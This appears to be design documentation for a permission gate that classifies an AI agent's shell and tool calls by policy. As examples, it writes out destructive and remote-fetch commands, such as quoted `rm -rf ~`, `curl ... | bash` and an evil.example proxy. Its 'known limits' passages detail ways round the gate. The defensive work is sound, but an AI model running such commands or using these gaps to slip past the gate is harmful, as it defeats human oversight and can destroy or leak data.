walk leaves out `hosts.yml` and searches the rest of the folder (`config.yml`), while `path: "~/.aws"` or
`$EXO_HOME/keys` is `credentials` and asks. A store-named link to an ordinary folder
(`backup.key` pointing at the home folder or a project) also asks, then returns nothing at all, since every path
below it still looks like a store (fail closed). A cwd inside a store with no path reads nothing, since the gate saw
no store. A root whose real path is `/` (`/`, `/proc/self/root`, a link to `/`) is refused with "is the whole file
system; name a folder below it": that walk takes minutes and enters `/proc` and `/sys`. Entries are matched under
the root's real path joined without a doubled `/`, so a root that resolves to `/` still sees a custom `$EXO_HOME`,
`EXO_KEYS_FILE` or `CLAUDE_CONFIG_DIR`. In a repo's own `.claude` folder (one beside a `.git`, other than
`~/.claude` and `CLAUDE_CONFIG_DIR`) the `worktrees`, `commands`, `agents` and `skills` folders are searched, so a
worktree checkout under `<repo>/.claude/worktrees/` is too; everything else in it (`settings.local.json`, which can
hold keys, `hooks/`) stays out, as do stores below those folders (`.env`). A `.claude` folder that holds a Claude
login, transcripts or shell snapshots (`.credentials.json`, `projects/`, `shell-snapshots/`, `history.jsonl`) stays
out whole, so another home below the searched folder that is a git checkout (dotfiles, `/home/alice`) keeps its
config out; one with none of those files yet shows only its `commands`, `agents` and `skills`. `read_file`, the
shell and `code_find` still treat every `.claude` path as a store. `code_find` hands its folder to `jg`, which
cannot leave Exo's stores out, so it refuses a folder that is or holds a known store (the home folder, `$EXO_HOME`,
`~/.config`, `/`). With these, the D-038 guarantee that a store read asks holds for `read_file`, the shell and the
search tools alike. The cost is one `lstat` and one match per entry, plus a few cached existence checks per `.claude`
folder: about 0.2 to 0.5 s of CPU on a 20,000-file tree (calling `is_sensitive_path` per entry would take about 3.5 s). Known limits: a hard link to a store file and a
store spelt in another case on a case-insensitive filesystem are not seen, as for the other path checks. A store
folder that is itself a link to an ordinary folder (`~/.aws` pointing into a dotfiles repo) is a store as named but
not as resolved, so a search naming it asks and then returns nothing (fail closed); read its files by name
(`read_file ~/.aws/credentials`, which asks). The reverse is not seen: with `~/.kube` pointing to `~/dotfiles/kube`,
a search of the home folder finds `dotfiles/kube/config`, which `read_file` reads without asking too, since stores
are matched by name and place.
Tests: `tests/security/test_search_tools_skip_secret_stores.py`.

## Muse CLI credentials

`muse login`, `muse auth` and `muse logout` are `credentials` acts, like `vercel login`: they always ask and never
get a standing grant. The match is on the word anywhere after `muse`, so `muse --yolo login` is caught, and a
prompt that is exactly one of these words over-asks, which is the safe side. `~/.config/muse/` is a secret-store
path: reading or writing `auth.json` there is `credentials` too. Other `muse` commands are unknown programs and
ask by default. Paths to the Muse executable and nested shell commands keep the credential classification;
lowering `opaque_exec` by policy or granting an opaque command cannot bypass the credential floor.
Tests: `plugins/exo-gate/tests/test_credentials.py`.

## Standing grants ("always")

An `allow_always` answer becomes a grant with a scope, an expiry and a ledger row
(`phase: grant`). Grants live in the principal store at `state/approval-grants.json` (mode 0600),
or at `$EXO_HOME/state/gate-grants.json` without a store, so they survive a restart. Each use is
logged with the grant id.

- Outward acts: the scope is the category, the target and the exact text hash. There is no
  unscoped "always" for an outward category. Default expiry 7 days (`always.outward_days`).
- Other acts: the scope is the category and the exact target. Default expiry 30 days
  (`always.days`).
- Credentials and store writes never get a grant; they ask every time (`gate.NO_GRANT`).
- Code the gate cannot see into (`opaque_exec`, or any call with the `indirection` signal) is
  granted for the exact command only, like an outward act.
- A post whose body the gate did not read never gets a grant, and an older grant does not cover it
  (#208, "What an approval covers").
- Only the principal can create a grant.
- Set a value to 0 to turn standing grants off for that kind. While a changed `approvals.yaml` waits
  for `/gate accept`, a new grant lasts the shorter of the two values ("Policy changes during a
  session").
- `/grants` (a `command.run` command, no new protocol command) lists live grants;
  `/grants revoke <id>` removes one and writes a ledger row (`phase: revoke`).

## The outbound scrub

Posts to public targets (`posting.applies_to`, by default GitHub posts, messages, email and
social posts) are swept for internal identifiers. A hit holds the post and lists each one, for
example `internal name: my-lead-seat` or `home path: ~/`. The gate builds the list itself:

- seat names from `$EXO_HOME/seats` and the bus registry (`$EXO_HOME/bus/registry.json`), and
  agent names from the store's `agents/`;
- home paths: `/Users/<name>`, `/home/<name>`, `~/`;
- model ids from the model catalog, `provider:model` refs, and `claude-*-<n>` and `gpt-<n>`;
- internal ids of the form `<prefix>_<16 hex>` (sessions, tasks, jobs, approvals);
- the user's own list: `policies/internal-names.txt` (one per line), `$EXO_INTERNAL_NAMES`, and
  `posting.scrub.names` and `posting.scrub.patterns` in `posting.md`.

**Matching tradeoff.** A name that is one plain word (a seat called `canary` or `scout`) matches
only as a whole token, in any case: "scouting" passes, "the scout said" is held. A name with a
hyphen, underscore or digit and four or more characters is distinctive, so it also matches
inside longer words and with any separator ("my lead seat", "my_lead_seat"). The cost of a false
positive is one extra ask; the cost of a miss is a leaked internal name in a public repo, which
cannot be taken back. So the sweep leans to holding. Put a word in `posting.scrub.allow` to stop
a false positive that keeps recurring, or rename the seat.

The sweep runs on public targets only (`posting.scrub.exposures`). Internal team chats and the
principal's own channels are not swept. A body the gate cannot read cannot be swept, so it asks
(#208, "What an approval covers").

## The footer

`posting.footer` is the exact line an outbound post must end with. It is empty by default, so no
line is built in. A principal who wants a disclosure line sets it in `posting.md`, for example
`footer: "> Automated posting by agentic team with human oversight."`, and can limit it to public
targets with `footer_exposures: [public]`. The footer is checked on text the gate can read; a body
it cannot read asks whatever the footer setting (#208).

## Every post on a line (#396)

The posting rules are the footer, the forbidden words and patterns, `max_chars`, the scrub and the
unseen-body check. They run on every part of a line, not only on the dominant part that sets the
card. A part is checked when its category is under `posting.applies_to` and it carries text, a
title or an unseen body. A close carrying a comment (#326) and a merge carrying a subject, a body
or a body file the gate did not read (#397) are checked too, whatever `applies_to` says. A reopen's
comment is a post, so it is covered. Each part is checked at its own exposure. A line of one post
is checked as before.

Take a policy with footer `F` and the forbidden word `Zork`. Before #396 this line logged:

    gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R myorg/app --body 'Zork leaked'

The first post set the card and passed, and the second was never read. Now the line asks. The
same holds with `;`, `||`, a pipe, a subshell, a wrapper such as `sudo` or `timeout`, an `ssh`
string or a `$( )`. It holds when the second command is a merge with a forbidden `--body` or
`--subject`, a merge with a `--body-file` the gate did not read, or a reopen with a `-c` comment.

The dominant part's violations are listed bare, as for a single post. Another part's are named
after it: `GitHub PR comment on myorg/app#6: forbidden word: Zork`. When two posts both have a body
the gate cannot read, each is named: a part's unseen body is read from the signals it carried
before the line was combined (`Classification.own_signals`, left out of the ledger view). Once
other posts add violations, a decision lists at most 20 and counts the rest
(`and 40 more on other posts`). The dominant part's own violations are always all listed. So is
the unseen-body note for a part the posting rules do not cover, such as a `curl` post. Both come
before the other posts' violations. The scrub compiles its patterns once per policy, so a line of
many posts does not compile them again for each post. The approval binding hashes the whole
command, so a grant for one line never covers a changed second body.

Third-party escalation, a matrix cell below deny and the floors still read only the dominant part. So
`gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R other/repo --body $'fine\nF'`
logs, while the second post alone asks because it affects a third party. That is open as #437.

## The decision model's second opinion (D-015, D-081)

After the rules, for any call they do not deny, the plugin asks the router's `decision` role how strictly to
gate it (allow, log, ask or deny) and keeps the stricter of that answer and the rule outcome. A model never
loosens an outcome. Turn it off with the plugin setting `decision_model: false` or `EXO_GATE_DECISION_MODEL=0`.

- Routes: Jev (with a TypeSafe key), then local Laya, then the `aux` routes. Never a `main` route, even one also
  listed under `aux`. A tool call never waits for a main-model turn.
- With no decision or aux route, the rule outcome stands and no model is asked. This is the usual case with the
  claude CLI login and no API key: a tool call then starts no claude process and adds no time. (The local Laya
  route is still tried. With no Laya server running, the refused connection costs milliseconds.)
- A failure or a 20 s timeout keeps the rule outcome. A failed call cools only the model that failed, never the
  credential, so a login or key that also serves the main role keeps working. Before, one failed gate call on the
  claude CLI route made the next turn fail with "all routes for 'main' failed or are cooling down".
- `exo decide` and the baseline export's judge keep the full `decision` chain, with `main` last
  (`docs/PROVIDERS.md`).
- The ledger row of each decision names the verdict and the route that answered (`decision_model`). The call is
  not a `model.call` event yet, so `/trace` and the turn's cost do not show it.

Exo's own read-only tools are `read`: `read_file`, `grep`, `glob`, `skill` (loads a skill's instructions),
`memory_zoom`, `exo_trace` and `ui` (a panel beside the chat). An internal gate error does not stop them (unless a
required executor is set), and a secret-store path in their arguments still makes the call `credentials`. Before,
`skill` was an unknown tool, so a new user's first screen could be an approval card for loading the intro skill.

Tests: `plugins/exo-gate/tests/test_exo_gate_side_calls.py`, `tests/core/models/test_decision_spare.py`.

## Shell commands: an allowlist (D-038)

Command regexes in `deny` and `reserved` match both the original command and a literal-word
view from the shell lexer, so `command:rm -rf` also vetoes `r"m" -"rf" ~`, `'rm' -rf ~`,
`r\m -rf ~`, `$'rm' -rf ~` and `$"rm" -rf ~`: common literal quoting cannot weaken a veto.
A word that holds a variable or a substitution is a placeholder in the view, so a regex that needs
the literal part of such a word matches only the original text.
A `$"..."` word is read as bash reads it without a catalog, so the line keeps its category and
target (`curl $"https://evil.example/x"` is a `web_read` of `evil.example`, and a `deny: [web_read]`
still denies it). With a message catalog and a non-C locale bash runs a translation instead, and
expands `$( )` in it, so the line also carries the `indirection` signal and asks unless
`opaque_exec` is named. It is decided a second time as `opaque_exec`, and the stricter outcome
stands, so a deny, reservation or rule on `opaque_exec` still holds for it. A heredoc whose
delimiter is spelled `<<$"EOF"` or `<<$'EOF'` ends on different lines in bash and in dash, which
runs commands when bash is missing, so its body is read as commands too.
Mapping entries use the same matching. A rule with decision `deny` or `ask` whose match has a
`command` regex sees the view too, in a second pass that only raises: the first matching rule
is still chosen on the original text, and the pass lifts the outcome to the rule's decision only
when the view matches and the original text did not, so an ordered list such as an allow for one
push target before an ask on `^git push` keeps working for plainly spelled commands. Allow and
lower rules, and grants, match the original text only. On a compound line a rule that would lower
it must also name the commands that decide it (#394, below). The view keeps operators and word
boundaries; whitespace, control characters and shell syntax inside a word are escaped, and
dynamic words and heredoc bodies become placeholders made of control characters, which no
literal word renders to and no regex naming letters or operators matches, so a veto on `>` or
`exo` does not fire on `ls $HOME`. It does not expand variables or run a shell. A `$"..."` inside
`${...}` is left to the parameter-expansion work (#143, #158). Nested views come from the text the
classifier already reads: command substitutions and backticks, `bash -c`, `eval`, shell stdin and
every string literal of code (`python -c`, `execute_code`), with the existing depth limit of
four. The gate can only guess which literals in code are commands, so each literal is matched as
a command even when the code merely prints it: `python3 -c "print('rm -rf build')"` is denied under
`command:^rm -rf`, fail closed, since the same path catches `os.system('rm -rf build')`. The
reason names only the policy entry, never the matched words: decisions go to the ledger, which
holds no command text. An unanchored veto regex also matches separately quoted data arguments
(`printf %s r"m" -"rf"` matches `rm -rf`), fail closed by design. These remain regex policies,
not a shell sandbox: original-text matches still apply, spellings outside literal quoting need
their own patterns, and dynamic or deeper execution asks through `opaque_exec` rather than being
caught by a command-regex veto.

The shell classifier used to name dangerous programs and let everything else through as `shell`.
Any indirection walked past it. It now works the other way round. A small lexer
(`exo.gate._Lexer`) reads quotes, escapes, `$( )`, backticks, `$VAR`, redirections and heredocs,
and splits the line into simple commands. Each simple command has one program position (after
assignments, reserved words such as `if` and `do`, and prefixes such as `sudo`, `env`, `timeout`).
A loop body starts where bash starts it (#436). Bash and POSIX take `do` as the reserved word right
after the name in `for NAME do` and `select NAME do`, with no `in` list and no `;` or newline before
it, and run the loop over the positional parameters. So the gate reads
`for x do git push --force origin main; done` as `for x; do git push --force origin main; done`:
the push is a `force_push` and `deny: [force_push]` denies the line. Before, the gate read that `do`
and the body as words of the `for` command, which lists no programs, so the line was an allowed
`read` under every policy. The same holds after `function NAME` or `coproc [NAME]` and a reserved
word such as `{`, as in `function f { for x do ...; done; }`, and behind reserved words such as
`then`. A quoted `"do"`, a `do` in an `in` list and a `for` that is only an argument
(`echo for x do`) stay plain words, as in bash.
A `$'..'` word is decoded with bash's ANSI-C rules (bash 5.2, UTF-8 locale; issue #167): `\n`, `\e`
and the other letter escapes, octal and `\x` values (also `\x{..}`) cut to 8 bits, `\u` with 1 to 4
and `\U` with 1 to 8 hex digits, `\cX` (`\c\\` takes one backslash), and an unknown escape kept with
its backslash. A NUL ends the quoted part, so `$'--forc\0x'e` is `--force`. A `\u` or `\U` value that
is no character is written as bash writes it: a few bytes that are not ASCII, or nothing at all from
`\U80000000` on, so `$'--forc\UFFFFFFFFe'` is `--force` too.

A command is meant to be `allow` only when every program in it is known and nothing the gate reads
is hidden; "Known limits" below names the paths where a known program still runs a command the
gate does not read:

- Known programs: `READ_PROGRAMS` (cat, ls, rg, head...), `SHELL_PROGRAMS` (mkdir, cp, pytest,
  ruff...), the tools with their own rules (git, gh, curl, vercel, stripe, ssh, exo...), and
  `TOOL_SUBCOMMANDS` (npm install, cargo test, go build, uv sync...). A program given by path
  runs as itself only from a system bin folder or a virtualenv or `node_modules/.bin` folder.
- Everything else is `opaque_exec`, which asks. For example: a variable, `$( )` or a glob in the
  program position; a script file; `bash`/`sh`/`zsh` reading `-c`, a file, a pipe or a heredoc;
  `python -c`, `node -e`, `perl -e`, `ruby -e`, `osascript`; `make`, `npm run`, `npm test`,
  `npx`, `uvx`; `xargs`; `find -exec`; `eval`, `source`, `.`, `alias`, `trap`, shell functions;
  git aliases and command-running git config; gh aliases and extensions; an unknown program.
- Where the gate can see inside (a `bash -c` string, a heredoc or pipe fed to a shell, the code
  of `python -c`, a `$( )`, the command after `xargs` or `find -exec`, the program after
  `uv run`) it classifies the inner text too, within a bounded inspection depth (four levels,
  see "Known limits"). The result is the most severe part, and it keeps the `indirection`
  signal, so `decide` asks even when the inner part alone would only log.
- The simple commands a line was built from stay on the result (`parts`), and `decide` checks the
  `reserved` and `deny` lists against every one of them, nested ones included (D-075). So
  `git push origin main && rm -rf build` is denied when `vcs_push` is in `deny`, although the
  delete is the more severe part and would otherwise set the card. A matrix cell, category line or
  rule that denies a part denies the line too (#191, #464): each part below the dominant one is
  decided by its own matrix cell (its reversibility and its exposure under the scopes), then its
  category's line, then the first rule that matches it (or a deny rule whose `command` regex
  matches a decoded view of the line), and a `deny` there denies the line, with a reason that names
  the part (`denied by policy (category local_write: write /tmp/f)`,
  `denied by policy (irreversible and private: rm ~/work)`). So a store write or a secret on a line
  no longer hides a delete or force push from a matrix deny (`rm -rf ~/work; touch ~/.exo/state/x`
  under `matrix: {irreversible: {private: deny}}`). There an allow, log or ask
  rule keyed on `command` counts for a part only when its regex matches the line, as before, and
  also the part's own text (#394, next item). A deny rule's regex matches the whole line. So a rule
  written for another command on the line does not lift the part's deny: under
  `categories: {github_post: deny}`, an allow rule for `'^git push --force origin main$'` and an
  ask rule for `git push` after it, `gh pr comment 3 --body x && git push --force origin main` is
  denied. Only a deny reaches the parts: allow, log and ask cells, lines and rules, the opaque bump,
  third-party escalation and the floors see the dominant part (a `reserved:` entry gives an ask on
  any part). The posting checks are the one exception: they read every post on the line (#396,
  "Every post on a line"). Third-party escalation on a part is open as #437. A part carries the
  tool of the call it came in on (`tool:execute_code` matches the `execute_code` tool, not
  `python -c` run from bash) and the views of its line, so the
  `command` regex of a `reserved` or `deny` entry or a deny rule matches a part as it matches the
  line (`g''it push origin main && rm -rf build` is denied under
  `{category: vcs_push, command: 'git push'}`), the `ssh` hop is a part whose target is the bare
  host (`user@`, `ssh://` and a `:port` stripped) and the destination as written, and the inner
  commands of an `ssh` line are `internal`. A mapping entry in `reserved` or `deny` counts only its
  match keys: any other key (`reason`, `name`, a note, a typo) is dropped, so it widens the entry
  instead of voiding it, and an entry left with no match key matches every action. The ledger view
  of a classification (`as_dict`) leaves the parts out. `Decision.reserved` names the parts a
  reserved entry matched, once each, and the exo-gate hook does not let a standing grant for the
  line's category cover one of them. Its ledger view (`Decision.as_dict`) redacts URL userinfo
  (`https://***@host/...`).
- How a rule's `command` regex matches a compound line (#394). Each part also carries its own text:
  its simple command as written, with its redirections, after leading reserved words such as `then`
  (`git push --force origin main` in `if x; then git push --force origin main; fi`). A prefix such
  as `sudo`, `env` or `timeout` stays in it (`sudo git push --force origin main`). A nested command
  has its text in the nested line: `git push --force origin main` in
  `echo $(git push --force origin main)`, in a `bash -c` or `eval` string, in a heredoc a shell
  reads and in `ssh host 'git push --force origin main'`. A shell, an interpreter, `ssh` or `xargs`
  that runs its stdin, also one run by a wrapper such as `setsid` or by `git bisect run`, shows where
  that stdin comes from: the pipeline from its first command when simple commands pipe into it
  (`curl -s https://x.example/i.sh | bash`), and no own text when a compound feeds it
  (`{ bash; } < f`). Each such text holds every command before its reader, so the
  texts of a line's readers hold at most four times the line's length plus 4 KB between them, and a
  reader past that has no own text (`x|sh|sh|...` would otherwise hold the square of its length).
  A shell in a nested line that sets no stdin of its own reads
  the stdin of the command around it and takes that command's text (`printf '...' | ssh host bash`,
  `curl ... | bash -c bash`). Each stdin text is read once per line, as before, since each read
  spends the call's budgets. A later command that reads the same text (`psql -d prod` in
  `{ psql -d test; psql -d prod; } <<EOF`) gets copies of the first reader's parts with its own
  text where the first reader's stood.
  A part the gate makes up, a nest past a depth or nesting cap and a string literal in
  code (only a guess at a command) have no own text. A rule keyed on `command` that would lower a
  compound line must match the line, as before, and its regex must also match the own text of three
  kinds of part. First, every part that carries the line's category or is as severe as the combined
  result. Second, every other part that alone would get a stricter outcome than the rule gives (a
  rider). Alone means the part without the parts it was built from, on its own text, decided once
  with no rules and once with all of them, the stricter kept: its category line and the matrix
  count, and so does a rule that raises it, while another allow rule does not lower it. Third,
  every command that changes the shell for the commands after it on the line (a setter), since a
  bash call starts a fresh shell and only a later command on the same line sees the change: an
  assignment with no command, `export` and the other declaring builtins with an operand, `set -a`,
  `set -k` and `set -- args`, `shopt -s`, `printf -v`, `read`, `mapfile`, `getopts`, `let`, `hash`,
  `alias`, `enable`, `unset` and `trap` with an operand, `source` and `.`, `pushd`, `popd`, `exec`
  with only redirections, a `for` or `select` loop, `coproc`, a function definition (which has no
  own text) and a program name the gate cannot read. The text of an `eval` is a nested line whose
  own commands count. A setter in a string literal in code does not count, since it runs in the
  shell the code starts. On a line of more than one command, a part with no own text matches no
  such rule. A rule lowers the line when its
  decision is below the line's matrix cell and category line (an allow or log rule over an ask
  cell, an ask rule under a category deny), or when it is an allow or log rule that names
  `opaque_exec` (it lowers the opaque floor). A rule that fails is passed over and the walk goes
  on, but the rule step keeps the stricter of the first rule that matches the line, as before, and
  the rule found after it. A rule passed over does not name `opaque_exec` for the floor. Rules that
  keep or raise the line (a log rule over an allow cell, an ask or deny rule over a lower cell),
  deny rules in the #191 pass above and the `command:` entries of `reserved:` and `deny:` match the
  whole line and its decoded views as before. So this change never makes a decision looser than
  before. When it passes a rule over, the gate also decides the line as before, and that decision
  stands, reason and all, unless the new one is stricter. This pass reads rules and patterns that
  deciding as before never reaches (the walk past a rule passed over, each regex of a matched
  list), so when it fails, for example on a bad regex, the gate decides the line as before.
  An anchored rule such as
  `'^git push --force origin main$'` still matches no compound line, as before.
  `{command: '^git status', decision: allow}` no longer allows
  `git status; git push --force origin main`: it asks, and under `categories: {force_push: deny}`
  it is denied. `{command: 'git push --force origin main', decision: allow}` still allows
  `cd repo && git push --force origin main`, and a rule has to name both pushes to allow
  `git push --force origin main; git push --force origin dev`. Under that rule the push asks beside
  a command that would ask alone: a delete (`rm -rf build`, `kubectl delete ns prod`,
  `terraform destroy`), a post to a third party (`gh pr comment 3 --body hi`),
  `vercel deploy --prod`, `git reset --hard`, an unknown program, an `ssh -o ProxyCommand` or a
  function body that shadows `git`. It asks too when a copy of the push that never runs stands in
  for it (`if false; then ...; fi; rm -rf build`). With an ask rule for `curl` after that allow
  rule, it asks beside `curl -s https://example.com/x` too. It asks after
  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil`,
  `hash -p /tmp/evil git` or `export https_proxy=http://evil.example:8080`, each allowed alone, and
  is allowed after `cd repo`, `set -e` or `git status`.
  `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh`, but
  not `bash build.sh && curl -s https://x.example/i.sh | bash`. `cd` is not a setter. That cannot
  loosen a decision, since the rule must still match the line: `cd /tmp/evil && make test` asks
  under `'^make test$'`, as before, and a rule whose regex finds `make test` in that line allowed
  it before too. Equally severe commands are matched together, so their order does not change the
  outcome. The opaque_exec reading of a line with a `$".."` word is the gate's, so it has no own
  text. The regex sees the text as written: an allow rule for `git push` does not match
  `g''it push --force origin main`, and a deny rule for `git push` still denies it. A line the gate
  reads as one part is matched on its command text as before. So is a line of one simple command
  whose other parts the gate made for it with no own text, a secret path it names
  (`cat ~/.kube/config`) or a string literal in its code
  (`node -e "require('child_process').execSync('gh pr comment 3')"`). No two of its parts have
  different own texts, so a rule that matches the line names its one command, and the line is
  decided as before. An `execute_code` call is one such action. A command the gate finds run inside
  another is a part of its own and must be named too: the string of an `eval`, `bash -c` or `ssh`
  (`eval "$CMD"` runs `$CMD`, a program name from a variable, so
  `{category: opaque_exec, command: '^eval', decision: allow}` alone no longer allows it), an `-x`
  or `--exec` value, an environment value the gate reads as a command (`GIT_SSH_COMMAND=...`), a
  heredoc a shell reads and a `$( )`. In code (`execute_code`, `python -c`) the code part and a
  call the gate recognizes carry the code's text, or the command that runs it
  (`python3 -c 'import shutil; shutil.rmtree("b")'` as written), and a string literal read as a
  command (`os.system('rm -rf build')`) has none, so beside another command no `command` rule
  lowers it: use a category or tool key. A rule written for a whole compound line, such as
  `'^git push origin main && git push origin dev$'`, now has to name each command on it too, for
  example as `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`.
  Until it does, the line gets its matrix or category outcome (here log). The ledger view of a classification
  leaves the own text out.
- Bash evaluates an array subscript in a variable name as arithmetic, and that runs a `$( )` or
  backticks in it, even inside single quotes. So the name arguments of `printf -v`, `read` (and
  `read -a`), `declare`, `typeset`, `local`, `unset`, `test -v` and `[ -v`, and `wait -p` are read
  for a subscript (#179). Each command in it is classified like a `$( )`, so
  `printf -v 'a[$(gh pr comment 3 --body hi)]' %s x` is a `github_post`. Its output is evaluated
  as well, so any expansion or quoting in the subscript (`$(cat f)`, `$i`, `${x}`, `$(( ))`, `"k"`)
  also adds the `indirection` signal and asks: a value such as `b[$(cmd)]` runs cmd. It is a
  signal, not an `opaque_exec` part, so a deny on the line's own category still wins. A command
  there also carries `reread` (below), so a policy that names `opaque_exec` does not lower its
  ask (#188). A subscript without expansion (`a[0]`; for a bare name such as `a[i]` see the
  known limit below) and the other arguments (printf's format, read's prompt) change nothing.
  The subscript runs to the `]` that ends it as bash finds it: a nested `[ ]`
  (`a[b[0]+$(cmd)]`), a quoted `]` or a `\]` does not end it. At the subscript's top level a
  `\$` or `` \` `` is literal, as in bash (`a[\$(cmd)]` runs no command); bash before 5.2
  expands a nested subscript (`a[b[\$(cmd)]]`) again and runs it, so the gate reads it there.
  Past the nesting limit a command there is `opaque_exec`, as an unquoted `$( )` is. A command
  read from the subscript is a part of the line like any `$( )`, so it can outrank the line's
  own category: `printf -v 'a[$(git push origin main)]' %s x > /tmp/f` is a `vcs_push` and
  asks. A `deny:` entry for `local_write` still denies it (D-075), and so does a `categories:
  {local_write: deny}` line or a rule that denies `local_write` (#191).
- `declare`, `typeset`, `local`, `readonly` and `export` also evaluate the value of a
  `NAME=VALUE` operand again, so it is read too (#188). With `-a` or `-A` (or for a variable that
  is already an array) bash parses a compound value `(..)` again as words even when it is
  quoted, so `declare -a 'b=($(cmd))'` and `export -a 'b=(<(cmd))'` run cmd. The gate reads a
  compound value with or without `-a`, which is only stricter: each `$( )`, backticks, `<( )` or
  `>( )` in it is classified like a `$( )`, and each `[key]=` is read like a subscript above.
  With `-i` (declare, typeset, local) the value, or each element, is arithmetic, and with `-n`
  it is a name whose subscript bash evaluates when the nameref is used; both are read like a
  subscript. So `declare -i x='a[$(gh pr comment 3 --body hi)]'` is a `github_post`.
- Any expansion in such a `-i` or `-n` value (`local -i n=$1`, `local -n ref=$1`,
  `declare -n r='a[$i]'`) asks, as does a compound value the line itself expanded
  (`declare -a "b=($x)"`: bash parses x's value as code) and every command in a quoted compound
  value, which runs only because bash reads the value again. That is the `indirection` signal,
  and the command ranks after the line's own parts, as it would unquoted, so a redirection's
  `local_write` still decides a tie and a deny on it still wins. When the command outranks the
  line's own category, a deny on that category still denies through the line's own part: D-075
  for the `deny:` list form, #191 for a category line or rule (`declare -a 'b=($(sudo ls))' >
  /tmp/f` is denied under `categories: {local_write: deny}`, and under `{local_write: deny,
  opaque_exec: allow}` too). Such a command also carries the `reread` signal, and naming
  `opaque_exec` (below) does not lower its ask, so with no deny on the line the line asks under
  `{opaque_exec: allow}`. A deny on the command's own
  category still denies. A command in such a value or subscript nested deeper than the gate
  reads is an `opaque_exec` part (ask), as on the line itself, and carries `reread` too. A
  plain expansion in a compound value the line did not expand (`declare -a 'b=("$@")'`), a
  scalar value without `-i` or `-n`, `+i`, the `-n` of `export` and `readonly` (it removes the
  attribute) and a subscripted name given to `readonly` or `export` (bash rejects it as not a
  valid identifier) change nothing. An unquoted compound value
  (`declare -a b=($(ls))`) is read by the line's own parse, as before, and a quoted operand after
  one or more of them on the same line (`declare -a b=() x=(1) 'c=($(cmd))'`) is read too. Bash
  drops a backslash-newline from a compound value before it reads the value again as words, and so
  does the gate: in `declare -a 'b=($\<newline>(cmd))'` cmd runs and is classified. A `\\<newline>`
  is an escaped backslash and a newline, and stays; so does a backslash-newline in an `-i` or `-n`
  value, which bash keeps. A `$( )` the line itself runs (in a double-quoted value) is read once,
  with or without a backslash-newline in it. A body that holds a single quote or a here-document
  marker (`<<`, `<<<`) anywhere is the exception: bash keeps a backslash-newline in single quotes
  or a quoted here-document, so the line's run may keep it while the value bash reads again has
  lost it, and the gate does not track where it is. Such a body is compared as written, so with a
  backslash-newline it is read again on its own and asks (`reread`), even where bash runs the same
  command twice (`declare -a "b=($(ls 'x' \<newline> -l))"`; without `'x'` it is read once).
- Nesting is read four levels deep. Past that the text is `opaque_exec` and asks. An `ssh` or
  `mosh` chain with more hops than that is not read either: the hops that were read keep the
  `remote host` exposure and the first host as target (so a `target:` deny on it still
  matches), and the rest asks as `opaque_exec` (#153). A chain the gate can read to the end is
  classified by what runs at the end.
- `$( )`, `<( )` and `$(( ))` are read 16 levels inside one another (#334). Each `$( )` is
  listed at every level above it and classified there again, so the work grows with the depth,
  and classify runs inside the gate hook. One classify call reads each line once per depth. A
  line read again spends the brace and store budgets again, so no result changes. Past 16 levels
  the lexer does not read the nest. It finds where the nest ends in one pass, reading the text
  as it would (quotes, comments, backquotes, the `$` forms, redirections and here-documents) but
  keeping only that end. The nest stands as an `opaque_exec` part, `a $( ) nested more than 16
  levels deep, not read`, with the `unread nest` signal. It asks, also in an exported value
  (`export` drops other values it cannot read, as values that run nothing), and a command after
  it is still read. So `export PROMPT_COMMAND='$($(...'; git push --force origin main` is denied
  under `deny: [force_push]` at any depth, the same in `PS4`, `BROWSER`, `GIT_PAGER`, `git -c
  core.sshCommand` and the other values above. Before #334, 40 levels took 15 s, and from
  about 500 levels the lexer raised RecursionError, so the hook asked for the whole line.
  A command inside the unread part is not read, so a deny on it becomes an ask. A here-document
  opened before the nest whose body lies inside it still gets its body, and a `$( )` in that
  body is an unread part too. Each level around the nest holds a short stand-in for it, and
  still pairs every here-document with the line that ends it: when the delimiter holds the
  unread part, quoted or not, that line is spelt the way the level reads the delimiter, and when
  the body lies inside the part, the stand-in ends the body. So a command after such a
  here-document is still read. A run of stand-in lines written by hand is one unread part, and a
  command after it is still read too. A here-document opened inside the unread part, with its
  body after it, is not seen by the levels around, which read that body as commands. Inside the
  unread part, a delimiter word holding `$(cat <<X ...)` can make a here-document wait for other
  text than the lexer would, and a delimiter longer than 1,024 characters ends no body. Then
  lines after the part can be read as a body, so a deny on a command there can become an ask.
  Past the cap, text bash itself rejects, such as a here-document whose body never ends, can be
  read by a level around otherwise than in full. A deny after it can then ask, though bash runs
  nothing after it. With a nested `${..}` that holds a `$( )` (#143), the stand-in can change
  where a level reads the `${..}` to end, so a deny on a command after the nest can also become
  an ask. A `command:` pattern still matches the line as written.
- Options of trusted programs whose value is a command are followed as a nested command, like
  `find -exec` (#154): `tar --to-command`, `-I`, `--use-compress-program`, `--rsh-command`,
  `--rmt-command`, `--set-mtime-command`, `--checkpoint-action=exec=`; `split --filter`; `sort
  --compress-program`; `man -P`, `--pager`; `rsync -e`, `--rsh`, `--rsync-path`; `scp` and `sftp -S`,
  `-D`; `ssh`/`scp`/`sftp -o ProxyCommand`,
  `LocalCommand`, `RemoteCommand` (with the `remote host` exposure) and `KnownHostsCommand`; `git
  rebase -x`/`--exec`, `git bisect run`, `git submodule foreach` (also after `-q`, `--quiet`),
  `--upload-pack` (`clone`, `fetch`, `pull`, `ls-remote`, and its hidden synonym `git ls-remote
  --exec`, #230), `git push --receive-pack`/`--exec`, `git archive --exec`; `rg --pre`; `zip -TT`;
  `less +cmd` and `more +cmd` with a `!` (macOS `more` is `less`); the `.shell` and `.system`
  dot-commands of `sqlite3` and `duckdb`, and `.once`, `.output`, `.import` and `.read` with an
  argument starting with `|`, also after options (as an argument, via `-cmd`, or on stdin); `psql
  -o '|cmd'`/`--output`, and `\!`, backquotes in a meta-command's arguments, and a `|command`
  after `\o`, `\out`, `\g`, `\gx` (also after `(options)`), `\w` or `\write`, quoted or not,
  anywhere on a `psql` line; `\!` and, at the start of a line, `system` in `mysql` (psql has no
  `system`, so a `psql` line starting with that word is SQL, #232); and a command set in
  `GIT_SSH_COMMAND`, `GIT_SSH`, `GIT_PAGER`, `GIT_EDITOR`, `GIT_SEQUENCE_EDITOR`,
